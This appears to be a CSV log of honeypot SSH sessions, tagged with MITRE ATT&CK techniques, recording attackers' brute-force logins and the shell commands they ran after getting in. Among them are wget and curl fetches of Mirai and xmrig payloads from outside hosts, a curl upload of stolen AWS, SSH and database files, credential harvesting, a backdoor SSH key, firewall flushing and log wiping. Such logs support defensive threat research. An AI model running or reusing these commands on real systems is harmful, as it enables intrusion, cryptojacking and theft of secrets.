event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-000817,F8A536F3,2025-01-04T22:56:58Z,command_executed,hp-us-01,198.199.119.50,34932,10.0.2.10,22,ssh,grafana,Autumn2023#,True,crontab -l 2>/dev/null > /tmp/.ct; echo '@reboot /tmp/.xmrig64 --donate-level 1 -o pool.minexmr.com:4444 -u 44AFFq5k... -p x -B' >> /tmp/.ct; crontab /tmp/.ct,14,US,AS14061,DigitalOcean,Cryptomining,T1496,Resource Hijacking,critical,,,,345,543,168,cryptomining,False,,caed2a1d-495f-47a7-a2de-5751509c8bce,
EVT-000818,F8A536F3,2025-01-04T22:58:07Z,command_executed,hp-us-01,198.199.119.50,49847,10.0.2.10,22,ssh,grafana,Autumn2023#,True,rm -f /tmp/.ct .setup.sh,15,US,AS14061,DigitalOcean,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,345,165,410,cryptomining,False,,c5f0aa0f-3cf8-4b46-ae6e-5ae5742d62a4,
EVT-001842,5DB0D538,2025-01-05T16:58:49Z,login_attempt,hp-ap-01,77.247.181.165,36408,10.0.3.10,22,ssh,root,Zte521,False,,0,NL,AS43350,NForce,Botnet/DDoS,T1110,Brute Force,medium,,,,91,692,1726,brute_force,False,,,
EVT-000535,FE70F6D6,2025-01-08T06:26:02Z,login_attempt,hp-ap-01,139.59.170.249,33997,10.0.3.10,22,ssh,chef,iloveyou,False,,0,IN,AS14061,DigitalOcean BLR,Supply Chain Abuse,T1110,Brute Force,medium,,,,552,324,1220,brute_force,False,,,
EVT-003692,E2F64EB8,2025-01-08T17:20:38Z,login_attempt,hp-us-01,77.247.181.165,37948,10.0.2.10,22,ssh,postgres,Juniper1!,True,,0,NL,AS43350,NForce,Botnet/DDoS,T1110,Brute Force,high,,,,515,382,919,compromised_login,False,,18e7703c-9bd8-41e0-915a-8b2954d15d45,
EVT-003694,E2F64EB8,2025-01-08T17:21:10Z,command_executed,hp-us-01,77.247.181.165,55549,10.0.2.10,22,ssh,postgres,Juniper1!,True,arch,2,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,255,409,botnet_ddos,False,,1aebdede-d4fe-4fe2-afb7-a3f9ee0d94a2,
EVT-003693,E2F64EB8,2025-01-08T17:21:18Z,command_executed,hp-us-01,77.247.181.165,36170,10.0.2.10,22,ssh,postgres,Juniper1!,True,uname -a,1,NL,AS43350,NForce,Botnet/DDoS,T1082,System Information Discovery,low,,,,515,270,223,botnet_ddos,False,,b7691675-6933-48c3-b530-9773eb7416c8,
EVT-003697,E2F64EB8,2025-01-08T17:21:33Z,command_executed,hp-us-01,77.247.181.165,38763,10.0.2.10,22,ssh,postgres,Juniper1!,True,df -h / | tail -1 | awk '{print $4}',5,NL,AS43350,NForce,Botnet/DDoS,T1082,System Information Discovery,low,,,,515,400,288,botnet_ddos,False,,9be5d671-c1bd-418d-bb25-6736f4bb2065,
EVT-003703,E2F64EB8,2025-01-08T17:21:33Z,command_executed,hp-us-01,77.247.181.165,41308,10.0.2.10,22,ssh,postgres,Juniper1!,True,iptables -A OUTPUT -j ACCEPT,11,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,548,287,botnet_ddos,False,,680d4675-48e6-462a-85aa-a0bd45c9cf14,
EVT-003695,E2F64EB8,2025-01-08T17:22:32Z,command_executed,hp-us-01,77.247.181.165,36865,10.0.2.10,22,ssh,postgres,Juniper1!,True,cat /proc/version,3,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,548,77,botnet_ddos,False,,d9964d07-6f8f-4718-bd99-7f9b5b81ff40,
EVT-003696,E2F64EB8,2025-01-08T17:22:46Z,command_executed,hp-us-01,77.247.181.165,46648,10.0.2.10,22,ssh,postgres,Juniper1!,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,590,176,botnet_ddos,False,,83883d38-8749-4d6b-a639-5c1fa9d86f66,
EVT-003698,E2F64EB8,2025-01-08T17:22:50Z,command_executed,hp-us-01,77.247.181.165,33392,10.0.2.10,22,ssh,postgres,Juniper1!,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,NL,AS43350,NForce,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,a77c5990cdaa47eb8772829a3bee1d3a,515,214,286,botnet_ddos,False,,b5aeefc9-87ed-4622-a452-ffb1fc464457,
EVT-003700,E2F64EB8,2025-01-08T17:23:10Z,command_executed,hp-us-01,77.247.181.165,57697,10.0.2.10,22,ssh,postgres,Juniper1!,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,NL,AS43350,NForce,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,f30033ff21384b2094b48184a806c37f,515,189,485,botnet_ddos,False,,6a62ef34-dde7-47b2-ab97-825e989c3b34,
EVT-003699,E2F64EB8,2025-01-08T17:23:54Z,command_executed,hp-us-01,77.247.181.165,38596,10.0.2.10,22,ssh,postgres,Juniper1!,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,NL,AS43350,NForce,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,0fdb51b9867b4ce28d76b9744b2ad12d,515,591,138,botnet_ddos,False,,f20cbb3b-683d-434f-a0e9-e9c211bccd54,
EVT-003702,E2F64EB8,2025-01-08T17:26:18Z,command_executed,hp-us-01,77.247.181.165,55756,10.0.2.10,22,ssh,postgres,Juniper1!,True,iptables -A INPUT -j ACCEPT,10,NL,AS43350,NForce,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,515,356,73,botnet_ddos,False,,5a79a5bc-6ab8-48ec-a046-28b90452c8e9,
EVT-003705,E2F64EB8,2025-01-08T17:26:55Z,command_executed,hp-us-01,77.247.181.165,48300,10.0.2.10,22,ssh,postgres,Juniper1!,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,NL,AS43350,NForce,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,515,106,166,botnet_ddos,False,,7bea6222-fae9-4c0d-9d59-605da1bf8ab2,
EVT-003701,E2F64EB8,2025-01-08T17:27:23Z,command_executed,hp-us-01,77.247.181.165,50041,10.0.2.10,22,ssh,postgres,Juniper1!,True,cd /tmp && /tmp/mirai &,9,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,273,57,botnet_ddos,False,,ee8288f9-e9f3-4d49-a947-12adcd7321d6,
EVT-003704,E2F64EB8,2025-01-08T17:27:38Z,command_executed,hp-us-01,77.247.181.165,49264,10.0.2.10,22,ssh,postgres,Juniper1!,True,iptables -F,12,NL,AS43350,NForce,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,515,558,490,botnet_ddos,False,,9dc8d316-17e3-4941-ab0c-30953617afb4,
EVT-003707,E2F64EB8,2025-01-08T17:28:38Z,command_executed,hp-us-01,77.247.181.165,38789,10.0.2.10,22,ssh,postgres,Juniper1!,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,NL,AS43350,NForce,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,515,590,173,botnet_ddos,False,,06eca8f1-b32f-4164-bdfe-2ee39de744a8,
EVT-003708,E2F64EB8,2025-01-08T17:28:38Z,command_executed,hp-us-01,77.247.181.165,55619,10.0.2.10,22,ssh,postgres,Juniper1!,True,history -c,16,NL,AS43350,NForce,Botnet/DDoS,T1070.003,Clear Command History,low,,,,515,85,99,botnet_ddos,False,,21ac4ca2-fe53-4165-b94a-b0fc4a5e9328,
EVT-003706,E2F64EB8,2025-01-08T17:29:02Z,command_executed,hp-us-01,77.247.181.165,40592,10.0.2.10,22,ssh,postgres,Juniper1!,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,NL,AS43350,NForce,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,45a28789dc8d4ded9722caf596641600,515,372,295,botnet_ddos,False,,11e79910-2435-4f3d-8e45-3d4bd98f710d,
EVT-001651,FFE3348C,2025-01-09T17:49:44Z,login_attempt,hp-eu-02,185.220.101.47,43189,10.0.1.11,22,ssh,chef,VMware1!,False,,0,DE,AS204837,HostSlick,Log4Shell/WebExploit,T1110,Brute Force,medium,,,,502,597,2648,brute_force,False,,,
EVT-000370,E4A3BBC3,2025-01-10T08:57:09Z,login_attempt,hp-eu-01,45.33.32.156,60380,10.0.1.10,2222,ssh,deploy,Winter@2024,True,,0,US,AS63949,Linode,Data Exfiltration,T1110,Brute Force,high,,,,275,474,2957,compromised_login,False,,47b02026-1173-45ce-a8c1-6fb0257b38f5,
EVT-000371,E4A3BBC3,2025-01-10T08:57:28Z,command_executed,hp-eu-01,45.33.32.156,47664,10.0.1.10,2222,ssh,deploy,Winter@2024,True,uname -a,1,US,AS63949,Linode,Data Exfiltration,T1082,System Information Discovery,low,,,,275,200,269,data_exfiltration,False,,02b556ae-9fd5-448d-8a97-3f23295720e5,
EVT-000373,E4A3BBC3,2025-01-10T08:57:42Z,command_executed,hp-eu-01,45.33.32.156,55671,10.0.1.10,2222,ssh,deploy,Winter@2024,True,cat /etc/environment,3,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,130,477,data_exfiltration,False,,0497d44d-73b6-4303-baf9-2b8038f46a40,
EVT-000379,E4A3BBC3,2025-01-10T08:57:45Z,command_executed,hp-eu-01,45.33.32.156,39164,10.0.1.10,2222,ssh,deploy,Winter@2024,True,aws sts get-caller-identity 2>/dev/null,9,US,AS63949,Linode,Data Exfiltration,T1078.004,Cloud Accounts,low,,,,275,593,440,data_exfiltration,False,,ae2c88ab-cfa4-4acd-947a-f043f1e97dc0,
EVT-000372,E4A3BBC3,2025-01-10T08:57:53Z,command_executed,hp-eu-01,45.33.32.156,39733,10.0.1.10,2222,ssh,deploy,Winter@2024,True,env | grep -iE 'aws|secret|key|token|pass|db|database',2,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,484,317,data_exfiltration,True,,af8793e3-7399-4f18-825d-6d9c6edcdf6f,
EVT-000376,E4A3BBC3,2025-01-10T08:57:57Z,command_executed,hp-eu-01,45.33.32.156,34495,10.0.1.10,2222,ssh,deploy,Winter@2024,True,find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -20,6,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,178,491,data_exfiltration,False,,b6fd6bd0-030c-4420-a983-70e347e49bbe,
EVT-000386,E4A3BBC3,2025-01-10T08:57:57Z,command_executed,hp-eu-01,45.33.32.156,42456,10.0.1.10,2222,ssh,deploy,Winter@2024,True,curl -s -F 'f=@/tmp/.loot.tgz' http://185.220.101.47:8080/rx,16,US,AS63949,Linode,Data Exfiltration,T1041,Exfiltration Over C2,critical,,185.220.101.47,,275,310,130,data_exfiltration,False,,c0cbc088-03fd-45fd-abfb-d2b3b2059564,
EVT-000374,E4A3BBC3,2025-01-10T08:58:01Z,command_executed,hp-eu-01,45.33.32.156,36377,10.0.1.10,2222,ssh,deploy,Winter@2024,True,find / -name '.env' -o -name '*.env' 2>/dev/null | head -30,4,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,335,67,data_exfiltration,False,,f3fc384d-948f-450e-a3a0-e861e3c1b187,
EVT-000381,E4A3BBC3,2025-01-10T08:58:04Z,command_executed,hp-eu-01,45.33.32.156,54708,10.0.1.10,2222,ssh,deploy,Winter@2024,True,aws secretsmanager list-secrets 2>/dev/null,11,US,AS63949,Linode,Data Exfiltration,T1555,Credentials from Password Stores,high,,,,275,330,87,data_exfiltration,False,,7968947f-1048-4b5a-b905-83665d313a09,
EVT-000388,E4A3BBC3,2025-01-10T08:58:21Z,command_executed,hp-eu-01,45.33.32.156,53990,10.0.1.10,2222,ssh,deploy,Winter@2024,True,shred -u -z -n3 /var/log/auth.log /var/log/syslog 2>/dev/null,18,US,AS63949,Linode,Data Exfiltration,T1070.004,File Deletion,low,,,,275,203,330,data_exfiltration,False,,847b12e7-3f76-451f-b401-dba6f4298c24,
EVT-000375,E4A3BBC3,2025-01-10T09:00:09Z,command_executed,hp-eu-01,45.33.32.156,38775,10.0.1.10,2222,ssh,deploy,Winter@2024,True,find / -name 'config.yml' -o -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | head -20,5,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,367,368,data_exfiltration,False,,9862f6ca-a1c7-4b0b-b34b-8e545fce92fa,
EVT-000385,E4A3BBC3,2025-01-10T09:01:24Z,command_executed,hp-eu-01,45.33.32.156,60290,10.0.1.10,2222,ssh,deploy,Winter@2024,True,tar czf /tmp/.loot.tgz /tmp/.all_db.sql ~/.aws/ ~/.ssh/ 2>/dev/null,15,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,435,136,data_exfiltration,False,,ad4eb003-045d-4d78-9f5d-67eef4fbc9cd,
EVT-000377,E4A3BBC3,2025-01-10T09:01:35Z,command_executed,hp-eu-01,45.33.32.156,38290,10.0.1.10,2222,ssh,deploy,Winter@2024,True,cat ~/.aws/credentials 2>/dev/null,7,US,AS63949,Linode,Data Exfiltration,T1552.001,Credentials in Files,low,,,,275,302,191,data_exfiltration,False,,3f3c2f6d-689b-46f5-9ffe-a77bf4c1423b,
EVT-000378,E4A3BBC3,2025-01-10T09:02:29Z,command_executed,hp-eu-01,45.33.32.156,35916,10.0.1.10,2222,ssh,deploy,Winter@2024,True,cat ~/.aws/config 2>/dev/null,8,US,AS63949,Linode,Data Exfiltration,T1552.001,Credentials in Files,low,,,,275,348,270,data_exfiltration,False,,022ef488-ea30-43b1-abc1-313db8ca81ae,
EVT-000380,E4A3BBC3,2025-01-10T09:03:09Z,command_executed,hp-eu-01,45.33.32.156,37584,10.0.1.10,2222,ssh,deploy,Winter@2024,True,aws s3 ls 2>/dev/null,10,US,AS63949,Linode,Data Exfiltration,T1530,Data from Cloud Storage,low,,,,275,165,224,data_exfiltration,False,,78eac5fd-b4c4-4066-b32f-8e8144f0981a,
EVT-000383,E4A3BBC3,2025-01-10T09:04:18Z,command_executed,hp-eu-01,45.33.32.156,35519,10.0.1.10,2222,ssh,deploy,Winter@2024,True,cat /var/www/html/wp-config.php 2>/dev/null | grep -E 'DB_|AUTH_KEY',13,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,386,88,data_exfiltration,False,,ae29e615-1d79-4d31-8729-9e450f14b29b,
EVT-000382,E4A3BBC3,2025-01-10T09:04:33Z,command_executed,hp-eu-01,45.33.32.156,36556,10.0.1.10,2222,ssh,deploy,Winter@2024,True,find /var/www -name 'wp-config.php' -o -name '.htpasswd' 2>/dev/null,12,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,430,441,data_exfiltration,False,,5f92e089-d6d4-410c-9b3d-9fc81c137ecc,
EVT-000384,E4A3BBC3,2025-01-10T09:04:37Z,command_executed,hp-eu-01,45.33.32.156,36160,10.0.1.10,2222,ssh,deploy,Winter@2024,True,mysqldump -u root -p'root' --all-databases 2>/dev/null > /tmp/.all_db.sql,14,US,AS63949,Linode,Data Exfiltration,T1005,Data from Local System,high,,,,275,577,161,data_exfiltration,False,,3996b3e1-23ae-4888-9cec-804b02efc1e5,
EVT-000389,E4A3BBC3,2025-01-10T09:09:11Z,command_executed,hp-eu-01,45.33.32.156,39476,10.0.1.10,2222,ssh,deploy,Winter@2024,True,history -c && unset HISTFILE && export HISTSIZE=0,19,US,AS63949,Linode,Data Exfiltration,T1070.003,Clear Command History,low,,,,275,281,216,data_exfiltration,False,,7684e3c5-73bb-4f30-a0b8-738f7a299b75,
EVT-000387,E4A3BBC3,2025-01-10T09:09:20Z,command_executed,hp-eu-01,45.33.32.156,48597,10.0.1.10,2222,ssh,deploy,Winter@2024,True,rm -rf /tmp/.loot.tgz /tmp/.all_db.sql,17,US,AS63949,Linode,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,275,562,299,data_exfiltration,False,,bb5d260d-0d36-4da7-8920-7f561883b4cc,
EVT-002670,69237777,2025-01-10T20:27:00Z,login_attempt,hp-eu-02,103.124.104.50,43528,10.0.1.11,22,ssh,backup,Summer2023!,True,,0,CN,AS45090,Tencent Cloud,Cryptomining,T1110,Brute Force,high,,,,569,209,2818,compromised_login,False,,6eb96e21-cee4-4ed5-a109-65887b4f2b11,
EVT-002671,69237777,2025-01-10T20:27:16Z,command_executed,hp-eu-02,103.124.104.50,48509,10.0.1.11,22,ssh,backup,Summer2023!,True,uname -a,1,CN,AS45090,Tencent Cloud,Cryptomining,T1082,System Information Discovery,low,,,,569,179,240,cryptomining,False,,33d054b2-9db6-43fe-adf2-de4b5c5598fe,
EVT-002675,69237777,2025-01-10T20:27:20Z,command_executed,hp-eu-02,103.124.104.50,58885,10.0.1.11,22,ssh,backup,Summer2023!,True,df -h,5,CN,AS45090,Tencent Cloud,Cryptomining,T1082,System Information Discovery,low,,,,569,556,314,cryptomining,False,,5bf7237e-fd5f-4bab-88ee-6e8ef7aea831,
EVT-002676,69237777,2025-01-10T20:27:42Z,command_executed,hp-eu-02,103.124.104.50,46395,10.0.1.11,22,ssh,backup,Summer2023!,True,id && whoami,6,CN,AS45090,Tencent Cloud,Cryptomining,T1033,System Owner/User Discovery,low,,,,569,436,314,cryptomining,False,,414f0849-dfe5-4860-aba0-810bd1d21954,
EVT-002674,69237777,2025-01-10T20:28:00Z,command_executed,hp-eu-02,103.124.104.50,55995,10.0.1.11,22,ssh,backup,Summer2023!,True,free -m,4,CN,AS45090,Tencent Cloud,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,569,339,482,cryptomining,False,,976149c5-ea92-49fc-aea3-0f43a164b755,
EVT-002672,69237777,2025-01-10T20:28:20Z,command_executed,hp-eu-02,103.124.104.50,39650,10.0.1.11,22,ssh,backup,Summer2023!,True,cat /proc/cpuinfo | grep -c processor,2,CN,AS45090,Tencent Cloud,Cryptomining,T1082,System Information Discovery,low,,,,569,404,71,cryptomining,False,,e0094fdd-90cb-4929-8d8a-7215faa07323,
EVT-002673,69237777,2025-01-10T20:28:48Z,command_executed,hp-eu-02,103.124.104.50,59244,10.0.1.11,22,ssh,backup,Summer2023!,True,cat /proc/meminfo | grep MemTotal,3,CN,AS45090,Tencent Cloud,Cryptomining,T1082,System Information Discovery,low,,,,569,552,408,cryptomining,False,,8f4cf30e-6af6-4922-b54d-96a1c873efd9,
EVT-002677,69237777,2025-01-10T20:30:16Z,command_executed,hp-eu-02,103.124.104.50,40028,10.0.1.11,22,ssh,backup,Summer2023!,True,ps aux | grep -E 'miner|xmrig|kswapd|pastebin',7,CN,AS45090,Tencent Cloud,Cryptomining,T1057,Process Discovery,low,,,,569,379,155,cryptomining,False,,e345d8f6-ffdb-4481-bd0f-a22e43825539,
EVT-002683,69237777,2025-01-10T20:31:07Z,command_executed,hp-eu-02,103.124.104.50,43813,10.0.1.11,22,ssh,backup,Summer2023!,True,nohup /tmp/.xmrig64 --donate-level 1 -o pool.minexmr.com:4444 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A -p x -B 2>/dev/null &,13,CN,AS45090,Tencent Cloud,Cryptomining,T1496,Resource Hijacking,critical,,,,569,262,112,cryptomining,False,,79ef45ae-3226-4a3e-80d0-e544c8821331,
EVT-002678,69237777,2025-01-10T20:31:24Z,command_executed,hp-eu-02,103.124.104.50,56075,10.0.1.11,22,ssh,backup,Summer2023!,True,pkill -f xmrig; pkill -f kswapd0; pkill -f pastebin,8,CN,AS45090,Tencent Cloud,Cryptomining,T1489,Service Stop,low,,,,569,564,465,cryptomining,False,,20b3e35d-b42f-4068-9e6c-e194bba9d0e4,
EVT-002685,69237777,2025-01-10T20:32:15Z,command_executed,hp-eu-02,103.124.104.50,45505,10.0.1.11,22,ssh,backup,Summer2023!,True,rm -f /tmp/.ct .setup.sh,15,CN,AS45090,Tencent Cloud,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,569,545,428,cryptomining,False,,7833c286-7709-4142-90ef-73971fabb488,
EVT-002680,69237777,2025-01-10T20:32:40Z,command_executed,hp-eu-02,103.124.104.50,52888,10.0.1.11,22,ssh,backup,Summer2023!,True,chmod +x .setup.sh && bash .setup.sh 2>/dev/null,10,CN,AS45090,Tencent Cloud,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,569,505,418,cryptomining,False,,95a02586-f484-403c-af0c-fb76203a1a93,
EVT-002679,69237777,2025-01-10T20:33:45Z,command_executed,hp-eu-02,103.124.104.50,40278,10.0.1.11,22,ssh,backup,Summer2023!,True,cd /tmp && curl -fsSL http://45.142.212.100/xmr/setup.sh -o .setup.sh,9,CN,AS45090,Tencent Cloud,Cryptomining,T1105,Ingress Tool Transfer,medium,yes,45.142.212.100,9587dbd210dd42ae916dc726f458e7ef,569,400,153,cryptomining,False,,1aeaa02d-2d93-40af-a839-9f17b20e0b09,
EVT-002681,69237777,2025-01-10T20:34:31Z,command_executed,hp-eu-02,103.124.104.50,33492,10.0.1.11,22,ssh,backup,Summer2023!,True,wget -q http://45.142.212.100/xmr/xmrig -O /tmp/.xmrig64,11,CN,AS45090,Tencent Cloud,Cryptomining,T1105,Ingress Tool Transfer,medium,yes,45.142.212.100,9f1ae9b4576945b19a6235c4929f2ddd,569,441,365,cryptomining,False,,777eecac-de4e-4576-a41f-dfa72a176243,
EVT-002684,69237777,2025-01-10T20:35:10Z,command_executed,hp-eu-02,103.124.104.50,34112,10.0.1.11,22,ssh,backup,Summer2023!,True,crontab -l 2>/dev/null > /tmp/.ct; echo '@reboot /tmp/.xmrig64 --donate-level 1 -o pool.minexmr.com:4444 -u 44AFFq5k... -p x -B' >> /tmp/.ct; crontab /tmp/.ct,14,CN,AS45090,Tencent Cloud,Cryptomining,T1496,Resource Hijacking,critical,,,,569,274,381,cryptomining,False,,47c8bb1e-13b1-463b-88d1-6cf16502103f,
EVT-002682,69237777,2025-01-10T20:35:12Z,command_executed,hp-eu-02,103.124.104.50,54462,10.0.1.11,22,ssh,backup,Summer2023!,True,chmod +x /tmp/.xmrig64,12,CN,AS45090,Tencent Cloud,Cryptomining,T1496,Resource Hijacking,critical,,,,569,179,202,cryptomining,False,,beeae071-fbaf-44e6-aef3-4bc3abceadf9,
EVT-002686,69237777,2025-01-10T20:37:24Z,command_executed,hp-eu-02,103.124.104.50,32984,10.0.1.11,22,ssh,backup,Summer2023!,True,history -c && echo > ~/.bash_history,16,CN,AS45090,Tencent Cloud,Cryptomining,T1070.003,Clear Command History,low,,,,569,117,182,cryptomining,False,,58986b04-fdfa-4f6b-ab1c-8789239cfe9f,
EVT-000141,B1093716,2025-01-11T02:00:53Z,login_attempt,hp-br-01,139.59.170.249,39849,10.0.4.10,22,ssh,backup,Huawei@123,False,,0,IN,AS14061,DigitalOcean BLR,Lateral Movement,T1110,Brute Force,medium,,,,368,215,2247,brute_force,False,,,
EVT-003430,F9AC87AA,2025-01-11T11:21:16Z,login_attempt,hp-ap-01,46.101.90.205,52652,10.0.3.10,22,ssh,nagios,icatch99,True,,0,DE,AS14061,DigitalOcean DE,Lateral Movement,T1110,Brute Force,high,,,,326,724,1850,compromised_login,False,,c7939d4b-449e-4705-a6e2-3866b5578ca0,
EVT-003431,F9AC87AA,2025-01-11T11:21:47Z,command_executed,hp-ap-01,46.101.90.205,56995,10.0.3.10,22,ssh,nagios,icatch99,True,uname -a,1,DE,AS14061,DigitalOcean DE,Lateral Movement,T1082,System Information Discovery,low,,,,326,582,445,lateral_movement,False,,980c08bf-21af-4822-85b1-09887927a536,
EVT-003441,F9AC87AA,2025-01-11T11:21:49Z,command_executed,hp-ap-01,46.101.90.205,47691,10.0.3.10,22,ssh,nagios,icatch99,True,cat /root/.ssh/authorized_keys 2>/dev/null,11,DE,AS14061,DigitalOcean DE,Lateral Movement,T1098.004,SSH Authorized Keys,high,,,,326,400,293,lateral_movement,False,,8c7276f9-75ab-420a-a75b-15e4bb7dd3bc,
EVT-003442,F9AC87AA,2025-01-11T11:21:52Z,command_executed,hp-ap-01,46.101.90.205,58589,10.0.3.10,22,ssh,nagios,icatch99,True,echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vKj9mNk3pLqR attacker@ops' >> /root/.ssh/authorized_keys,12,DE,AS14061,DigitalOcean DE,Lateral Movement,T1098.004,SSH Authorized Keys,high,,,,326,561,109,lateral_movement,False,,415bd7f0-e4ca-49cc-87d5-c1c85ad1b445,
EVT-003433,F9AC87AA,2025-01-11T11:21:58Z,command_executed,hp-ap-01,46.101.90.205,51249,10.0.3.10,22,ssh,nagios,icatch99,True,ip a | grep 'inet ',3,DE,AS14061,DigitalOcean DE,Lateral Movement,T1059,Command and Scripting Interpreter,low,,,,326,515,334,lateral_movement,False,,f634e147-8954-4e2b-a72b-44c98437c8f7,
EVT-003432,F9AC87AA,2025-01-11T11:22:04Z,command_executed,hp-ap-01,46.101.90.205,57238,10.0.3.10,22,ssh,nagios,icatch99,True,hostname && hostname -I,2,DE,AS14061,DigitalOcean DE,Lateral Movement,T1082,System Information Discovery,low,,,,326,276,474,lateral_movement,False,,5c47a7a2-5b97-4e17-9b6f-5bc0de3a2f5b,
EVT-003438,F9AC87AA,2025-01-11T11:22:20Z,command_executed,hp-ap-01,46.101.90.205,55197,10.0.3.10,22,ssh,nagios,icatch99,True,find / -perm -4000 -type f 2>/dev/null | head -20,8,DE,AS14061,DigitalOcean DE,Lateral Movement,T1548.001,Setuid and Setgid,low,,,,326,276,258,lateral_movement,False,,54f29c08-c20b-43e3-9545-62fc19b36920,
EVT-003434,F9AC87AA,2025-01-11T11:22:24Z,command_executed,hp-ap-01,46.101.90.205,39268,10.0.3.10,22,ssh,nagios,icatch99,True,ip route,4,DE,AS14061,DigitalOcean DE,Lateral Movement,T1059,Command and Scripting Interpreter,low,,,,326,158,299,lateral_movement,False,,5c821fa3-54dd-4c69-8853-b07675eb234c,
EVT-003447,F9AC87AA,2025-01-11T11:23:15Z,command_executed,hp-ap-01,46.101.90.205,42017,10.0.3.10,22,ssh,nagios,icatch99,True,cat /tmp/.scan.txt,17,DE,AS14061,DigitalOcean DE,Lateral Movement,T1059,Command and Scripting Interpreter,low,,,,326,172,473,lateral_movement,False,,0fd409a0-3089-4ca5-9770-9cc5302cf802,
